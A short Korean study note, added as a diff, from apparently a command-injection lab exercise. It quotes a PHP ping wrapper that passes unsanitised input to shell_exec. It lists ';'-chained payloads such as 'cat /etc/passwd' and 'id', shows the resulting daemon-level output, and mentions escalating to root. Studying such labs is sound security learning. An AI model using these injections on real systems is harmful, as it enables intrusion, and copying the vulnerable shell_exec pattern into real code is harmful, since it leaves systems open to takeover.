@@ -1,0 +1,14 @@
+21_커맨드인젝션 공격실습
+
+shell_exec('ping -c 4'. $target);
+=> 시스템 명령어 실행 명령어
+   -c 4 => ping을 보내는 횟수 option
+   
+; 을 사용해 다음 명령어를 함께 실행
+; cat /etc/passwd
+; ls
+
+; id (현재 권한을 알 수 있는 명령어)
+=> uid=1(deamon) gid=1(deamon) groups=1(deamon)
+   deamon 관리자 권한 사용 불가능
+   권한 상승단계를 통해 root 권한을 얻어 시스템을 장악
